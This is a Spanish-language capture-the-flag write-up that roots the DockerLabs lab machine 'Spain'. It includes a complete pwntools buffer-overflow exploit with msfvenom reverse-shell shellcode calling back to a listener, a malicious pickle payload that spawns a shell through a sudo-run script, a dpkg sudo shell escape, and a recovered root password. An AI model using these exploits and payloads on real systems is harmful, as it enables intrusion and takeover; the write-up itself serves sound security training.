# SPAIN - DOCKERLABS

## INFORMACIÓN Y DESPLIEGUE DE LA MÁQUINA

Esta máquina es de [DockerLabs](https://dockerlabs.es)

Para descargarla vas a [DockerLabs](https://dockerlabs.es) y buscas la máquina spain. Abres el enlace de mega, descargas el zip, lo descomprimes y ejecutas `bash ./auto_deploy.sh ./spain.tar`. De esta forma se ejecutará el contendor de docker de la máquina.

### descripción

- Dificultad: difícil
- Sistema Operativo: linux
- Autor: darksblack

## ENUMERACIÓN

### conectividad y SO

Hacemos un ping a la máquina:

```python
ping -c 1 172.17.0.2
```

![image](https://github.com/user-attachments/assets/f39d4ed9-1e66-4de3-a1db-b9740f6d932c)

Recibimos respuesta. Como el TTL es de 64, sabemos que la máquina usa Linux.

### puertos y servicios

Hacemos un escaneo de todo el rango de puertos por TCP con nmap:

```python
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG tcp_ports
```

> `-p-`: todo el rango de puertos

> `--open`: solo reportar los puertos abiertos

> `-sS`: usar el método de escaneo SYN, que es más sigiloso y rápido que el normal. Requiere privilegios a nivel de sistema para enviar raw packets

> `--min-rate 5000` enviar como mínimo 5000 paquetes por segundo

> `-vvv` triple verbose. Nada más descubrir un puerto lo muestra por pantalla, también muestra más información de lo normal sobre el escaneo

> `-n` no hacer resolución DNS

> `-Pn` no hacer host discovery

> `-oG tcp_ports` exportar el output en formato grepeable al archivo `tcp_ports`

![image](https://github.com/user-attachments/assets/b35eea0f-8f0d-44ca-92b6-7c46a52ea1ac)

#### puertos abiertos

**22 - TCP - SSH**

**80 - TCP - HTTP**

**9000 - TCP - CSLISTENER?**

Luego hacemos un escaneo de versiones y servicios sobre estos tres puertos:

```python
nmap -p22,80,9000 -sCV 172.17.0.2 -oN targeted
```

> `-p22,139,445` hacer el escaneo solo sobre los puertos 22, 139 y 445

> `-sCV` lanzar escaneo de versiones y scripts estándar de reconocimiento

> `-oN targeted` exportar el output al archivo `targeted`, en formato nmap

![image](https://github.com/user-attachments/assets/1e26bed5-0ee7-4ca3-a94b-2412b7ac1ac3)

### puerto 80

Si intentamos cargar la web, nos redirige al dominio spainmerides.dl, así que añadimos esta línea al archivo `/etc/hosts`:

```python
172.17.0.2 spainmerides.dl
```

Para poder resolver el dominio.

Ahora cargamos la web en el navegador:

![image](https://github.com/user-attachments/assets/b9b4e9f7-2b26-40a7-80dc-3aa739882189)

Sale esto. No hay nada interesante a simple vista ni en el códgio. Tampoco hay nada interesante en los archivos `index.php` o `efemerides.php`.

Hacemos fuzzing de directorios y extensiones con wfuzz:

![image](https://github.com/user-attachments/assets/7e289e55-a473-42ce-940f-f21cdfc91232)

Encontramos un archivo `manager.php`:

![image](https://github.com/user-attachments/assets/f9427512-0025-4d13-8a07-87663246430a)

Parece que es un panel para descargar archivos. Descargamos el único que hay, `bitlock`.

### INTRUSIÓN - BUFFER OVERFLOW

Antes de nada, ejecutamos `file bitlock`. Vemos que es un binario ejecutable de 32 bits. Ejecutamos `checksec bitlock`:

![image](https://github.com/user-attachments/assets/e8a8c5f5-f0bc-4d04-8ce8-6c5bf537da15)

No tiene protección del stack (canaries), no tiene el bit NX por lo que el stack es ejecutable, y tampoco tiene PIE, por lo que las direcciones del código siempre serán las mismas.

Probamos a ejecutarlo:

![image](https://github.com/user-attachments/assets/30318512-ec36-4e7b-a6a1-bf8cab1f014f)

Al parecer se pone en escucha por el puerto 9000. La máquina tiene este puerto abierto, por lo que alomejor es el mismo binario el que se está ejecutando.

Nos conectamos al localhost por el puerto 9000 con telnet y probamos a enviar mucho texto:

```python
telnet 127.0.0.1 9000
```

![image](https://github.com/user-attachments/assets/30de80d3-e4e4-41b4-aae8-31a93d0aae94)

![image](https://github.com/user-attachments/assets/a6e470f7-1bb0-46d6-99bd-963c93c6f103)

El programa peta y devuelve segmentation fault, parece que hay un buffer overflow. Vamos a ir automatizando toda la explotación del buffer overflow con pwntools.

Lo primero sacamos el offset para sobrescribir el registro EIP con este script:

```python
#!/usr/bin/python3

from pwn import *

def main():

    def get_eip_offset(pattern_length):

        p = process(filename)
        
        r = remote(target_ip, target_port)

        r.sendline(cyclic(pattern_length))

        p.wait()
        
        return cyclic_find(p.corefile.eip)

    
    target_ip = str(sys.argv[1])
    target_port = int(sys.argv[2])

    filename = "../content/bitlock"

    elf = context.binary = ELF(filename, checksec=False)
    context.log_level = "error"


    eip_offset = get_eip_offset(50)

    print(eip_offset)    
   

if __name__ == '__main__':

    main()
```

![image](https://github.com/user-attachments/assets/c2c14418-cc24-4ef5-9e70-5e21efabafbe)

Son 22 bytes. Ahora hacemos el script final, para enviar un shellcode a la máquina objetivo y que al ejecutarlo nos envie una reverse shell:

```python
#!/usr/bin/python3

from pwn import *

def main():
    
    target_ip = str(sys.argv[1])
    target_port = int(sys.argv[2])

    filename = "../content/bitlock"

    elf = context.binary = ELF(filename, checksec=False)
    context.log_level = "error"

    eip_offset = 22

    # ropper --file "bitlock" --search "jmp esp"
    jmp_esp = next(elf.search(asm("jmp esp")))

    
    # msfvenom -p linux/x86/shell_reverse_tcp --platform linux -a x86 LHOST=172.17.0.1 LPORT=443 -f c -e x86/shikata_ga_nai
    shellcode = (b"\xd9\xca\xd9\x74\x24\xf4\x5e\x31\xc9\xb8\x1d\xf2\xd4\x1f"
    b"\xb1\x12\x31\x46\x17\x83\xee\xfc\x03\x5b\xe1\x36\xea\x52"
    b"\xde\x40\xf6\xc7\xa3\xfd\x93\xe5\xaa\xe3\xd4\x8f\x61\x63"
    b"\x87\x16\xca\x5b\x65\x28\x63\xdd\x8c\x40\xd8\x0c\x6f\x91"
    b"\x48\x2d\x6f\x90\x33\xb8\x8e\x22\x25\xeb\x01\x11\x19\x08"
    b"\x2b\x74\x90\x8f\x79\x1e\x45\xbf\x0e\xb6\xf1\x90\xdf\x24"
    b"\x6b\x66\xfc\xfa\x38\xf1\xe2\x4a\xb5\xcc\x65")

    payload = flat({
        eip_offset: [

            jmp_esp,
            b"\x90"*16,
            shellcode
        ]
    })


    r = remote(sys.argv[1], sys.argv[2])

    r.sendline(payload)

    r.wait()

if __name__ == '__main__':

    main()
```

Nos ponemos en escucha por el puetro 443:

```python
nc -nlvp 443
```

Y ejecutamos el exploit:

```python
python3 remote_bof.py 172.17.0.2 9000
```

![image](https://github.com/user-attachments/assets/332bb708-acf6-4ac0-83a2-1105f89734a1)

Y nos llega la shell.

## TRATAMIENTO TTY

```python
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset
xterm
export TERM=xterm
export SHELL=bash
stty rows <filas> columns <columnas>
```

Para ver el número de filas y columnas que usa tu pantalla, ejecutas `stty -a`.

## ESCALADA DE PRIVILEGIOS

### maci

Somos el usuario www-data. Ejecutamos `sudo -l` para ver nuestros privilegios de sudo:

![image](https://github.com/user-attachments/assets/22e8fbf0-a946-446b-8751-fa78a72a016c)

Podemos ejecutar como el usuario maci, sin usar nuestra contraseña, el script `/home/maci/.time_seri/time.py` con `/bin/python3`. Tenemos capacidad de lectura del script:

```python
import pickle
import os

file_path = "/opt/data.pk1"
config_file_path = "/home/maci/.time_seri/time.conf"

def load_pickle_file(file_path):
    """Carga un archivo pickle y devuelve su contenido."""
    if not os.path.exists(file_path):
        print(f"El archivo {file_path} no se encontró.")
        return None
    
    try:
        with open(file_path, 'rb') as f:
            data = pickle.load(f)
            return data
    except PermissionError:
        print("No tienes permiso para leer el archivo.")
    except pickle.UnpicklingError:
        print("Error al deserializar el archivo: el archivo puede estar corrupto o no es un archivo pickle válido.")
    except EOFError:
        print("El archivo está vacío o truncado.")
    except Exception as e:
        print(f"Ocurrió un error inesperado: {e}")
    
    return None

def is_serial_enabled(config_file_path):
    """Verifica si la serialización está habilitada en el archivo de configuración."""
    if not os.path.exists(config_file_path):
        print(f"El archivo de configuración {config_file_path} no se encontró.")
        return False
    
    with open(config_file_path, 'r') as config_file:
        for line in config_file:
            if line.startswith('serial='):
                value = line.split('=')[1].strip()
                return value.lower() == 'on'
    
    return False

if __name__ == "__main__":
    if is_serial_enabled(config_file_path):
        data = load_pickle_file(file_path)
        if data is not None:
            print("Datos deserializados correctamente, puedes revisar /tmp")
#            print(data)
    else:
        print("La serialización está deshabilitada. El programa no se ejecutará.")
```

Parece ser que este script lo que hace es, primero ver si el archivo `time.conf` tiene la cadena `serial=on`, y si la tiene, llama a pickle.load() para deserializar el contenido del archivo `/opt/data.pk1`.

www-data tiene permisos de lecutra y escritura sobre `/opt/data.pk1`, así que podemos meter dentro un objeto serializado con un comando, para que al deserializarlo con sudo este se ejecute.

Nos vamos a `/tmp` y nos hacemos este script en python:

```python
#!/usr/bin/python3

import pickle, os

class RCE:

        def __reduce__(self):

                cmd = "bash"

                return (os.system, (cmd,))

rce = RCE()

with open("/opt/data.pk1", "wb") as f:

        pickle.dump(rce, f)
```

Luego vamos a `/home/maci/.time_seri`, abrimos el archivo `time.conf` y ponemos `serial=on`.

Finalmente ejecutamos:

```python
sudo -u maci /bin/python3 /home/maci/.time_seri/time.py
```

![image](https://github.com/user-attachments/assets/3fa5d4b0-e1a2-4104-b7a9-b2219e824acc)

### darksblack

Siendo el usuaro maci, ejecutamos `sudo -l`:

![image](https://github.com/user-attachments/assets/c44272e7-e6cd-4c29-9a1e-d1d92b505545)

Podemos ejecutar `dpkg`. Buscamos en [gtfobins](https://gtfobins.github.io/):

![image](https://github.com/user-attachments/assets/1d997682-8510-4010-99e3-33d2268e2f31)

Ejecutamos `sudo -u darksblack dpkg -l` y dentro del editor `!bash`. Pero nos da una restricted bash. Así que dentro del editor ejecutamos `!sh`:

![image](https://github.com/user-attachments/assets/38814ae6-147d-4364-a830-41d9d17002e1)

### root

En `/home/darksblack` vemos un archivo llamado `Olympus`. Probamos a ejecutarlo y se puede, pero nos pide una serial que no sabemos.

Probamos a listar archivos que pertenezcan al usuario darksblack:

```python
find / -user darksblack 2>/dev/null | grep -v proc
```

![image](https://github.com/user-attachments/assets/bcff8bf5-44e2-443b-bf6e-b86ad4e57628)

Vemos un archivo llamado `OlympusValidator`. Vamos a `/home/darksblack/.zprofile` y montamos un servidor HTTP con python3:

```python
python3 -m http.server 8000
```

Y en local lo descargamos:

```python
wget http://172.17.0.2:8000/OlympusValidator
```

Lo ejecutamos:

![image](https://github.com/user-attachments/assets/0cf0bbcb-bf21-489f-bdf3-f59ff84e2955)

Nos pide directamente la serial. Ponemos cualquier cosa:

![image](https://github.com/user-attachments/assets/c6163c7c-c929-4fab-8e85-b18cc3b2de42)

Y nos dice inválido. Probamos a ejecutarlo con `ltrace`, para ver sus llamadas a funciones:

![image](https://github.com/user-attachments/assets/40f6161e-7eae-436a-9fe6-629337928349)

Vemos que compara nuestro input con "A678-GHS3-OLP0-QQP1-DFMZ". Metemos la serial:

![image](https://github.com/user-attachments/assets/6da6f7c1-ec68-4389-9be2-04b0ec297ca1)

Y nos da una contraseña de root para el SSH: `@#*)277280)6x4n0`.

Nos conectamos:

```python
ssh root@172.17.0.2
```

Y de contraseña: `@#*)277280)6x4n0`.

![image](https://github.com/user-attachments/assets/8db5892c-dff1-4c06-9653-6ee0ce82e228)

Y ya somos root en la máquina Spain.